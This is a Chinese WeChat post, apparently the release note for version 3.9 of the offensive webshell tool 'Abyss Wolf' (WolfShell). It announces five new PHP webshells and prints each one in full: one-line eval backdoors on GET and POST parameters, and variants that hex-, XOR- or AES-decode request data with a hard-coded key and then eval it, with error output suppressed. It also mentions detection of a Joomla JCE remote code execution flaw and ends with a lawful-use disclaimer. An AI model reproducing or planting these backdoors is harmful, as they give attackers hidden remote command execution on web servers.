---
title: 幽狼V3.9 新增PHP WebShell
url: https://mp.weixin.qq.com/s/hmgI5fjDe_9JDDrjvBVo9w
source: Doonsec's feed
date: 2026-07-11
fetch_date: 2026-07-12T05:08:35.190045
---

# 幽狼V3.9 新增PHP WebShell

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/p6tibQrAWXsqvY2XX8K2FG7azwEicJNy3PyniaFRHCCYhPXgQwx3mK4HWibt8nzicp82vFeTBJicria2aHicKVTH15MlkLdHa3dHe16cTDKG6Iyr2X4/0?wx_fmt=jpeg)

# 幽狼V3.9 新增PHP WebShell

0x7556
0x7556

幽狼之影

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

## 🐺 幽狼 · Abyss Wolf

传说，在每一行代码的阴影里，蛰伏着一头来自深渊的**狼**。它以**废弃的字节**为食，以**破碎的协议**为巢。无人得见其形，只因它的**爪痕从不留在日志之上**。它不追逐光，不咆哮于风，只等**那扇虚掩的门扉**。当**门缝透出权限的微光**，幽狼便**悄然而至**——那时，**所有告警沉默，所有进程沉睡**，仿佛整个世界都不曾察觉。唯有虚空记得：**幽狼已至，万物无声。**

## 更新信息

### V3.9 20260705 新增PHP WebShell

* [+]新增 PHP AES CmdShell
* [+]新增 PHP XOR CmdShell

* [+]新增 PHP Hex CmdShell
* [+]新增 PHP Base64 CmdShell (兼容菜刀)
* [+]新增 PHP Plain CmdShell (兼容部分组织)

![](https://mmbiz.qpic.cn/mmbiz_jpg/p6tibQrAWXsqtrzVia5iaOqzuHxqTvLGKVx7kTP5R7PrBJia2vj2jaOhiauMaHcG7xCp4H5KI1338d1ExlcIYqwXjra5zibZMdhtywwqBftibHP8P0/640?wx_fmt=jpeg&from=appmsg)

幽狼核心采用AES加密通讯机制，但在实战场景中，并非所有目标环境都预装了AES加密依赖组件。综合兼容性最优的加密通讯方案为XOR、HEX、Base64三类，其中‌Base64编码生成的内容长度最短‌，可适配更多存在长度限制的漏洞场景，同时天然兼容菜刀、哥斯拉等主流WebShell工具。Plain明文通讯模式则专门用于实验环境下的Payload调试，还可直接对接部分组织通过浏览器操作的Shell。

## Plain 明文通讯

为了兼容部分组织的Shell密码不加密成Hash

```
<?php @eval($_GET['WolfShell']); ?>
```

## Base64 加密通讯

为了兼容菜刀等WebShell密码不加密成Hash

```
<?php @eval($_POST['WolfShell']); ?>
```

## Hex 加密通讯

```
<?php
@error_reporting(0);
$k = "ca63457538b9b1e0";
if (isset($_POST[$k])) {
    $dec = hex2bin($_POST[$k]);
    eval($dec);
}
?>
```

## AES 加密通讯

```
<?php
@error_reporting(0);
session_start();
$key = "ca63457538b9b1e0";
$_SESSION['k'] = $key;
$post_data = file_get_contents("php://input");
if (strlen($post_data) > 0) {
    if (extension_loaded('openssl')) {
        $decrypted_data = openssl_decrypt($post_data, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $key);
        if ($decrypted_data !== false) {
            eval($decrypted_data);
        }
    }
}
?>
```

## XOR 加密通讯

```
<?php
@error_reporting(0);
session_start();
$key = "ca63457538b9b1e0";
$_SESSION['k'] = $key;
$post_data = file_get_contents("php://input");
if (strlen($post_data) > 0) {
    $kl = strlen($key);
    $decrypted_data = "";
    for ($i = 0; $i < strlen($post_data); $i++) {
        $decrypted_data .= $post_data[$i] ^ $key[$i % $kl];
    }
    eval($decrypted_data);
}
?>
```

### V3.8 20260704 新增分组显示

* [u]幽狼 EXE 改名 AIbyssWolf 简写AW

+ **AI：人工智能**
+ **abyss：深渊**
+ **wolf：狼**

* [+]优化Shell加载速度，减少卡顿，XML 解析时不碰 UI
* [+]右键菜单分组显示 （字母排序、当前组自动打勾、不重复刷新）
* [+]增加EXE文件SHA1值列表，方便用户验证是否原始文件

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/p6tibQrAWXspxZkgEgDmICTccpeLXyqlaB2WCKiad45veAXO1z5mqeibXPqjOpKkQnYYT0weqcz7hRicyerBlam42kBvFTLRkziaFgbib2qSAHSnA/640?wx_fmt=jpeg&from=appmsg)

CVE-2026-48907  Joomla JCE Editor中的一个 未授权远程代码执行 漏洞检测，影响版本 2.9.99.4 及之前版本。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/p6tibQrAWXsozU9QIKXena86658213YAiahcPIia38aQpP9zHIQyILaf1zq5BK4RSUp1UXPUYFsNfn4Mibe4BibHU00d4cHd405HWBDPuJtMZvaM/640?wx_fmt=jpeg&from=appmsg)

## 免责声明

* 使用WolfShell时，请遵循相关法律法规，确保在授权的环境中进行测试和使用。
* 本工具仅供教育和研究目的，任何滥用行为将由用户自行承担后果。

## 软件主页

* 幽狼Shell：https://github.com/0x7556/wolfshell
* McpSerer: https://github.com/0x7556/PentestMCP

预览时标签不可点

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/Bua8mEDRSfdqtGg7TaoSf1iayXEx0tQKI7JLXicqPubWia0P4UWmd09JRfOiaicQb7iclpOD1gjCs2xjrEmow3Xib0VaQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过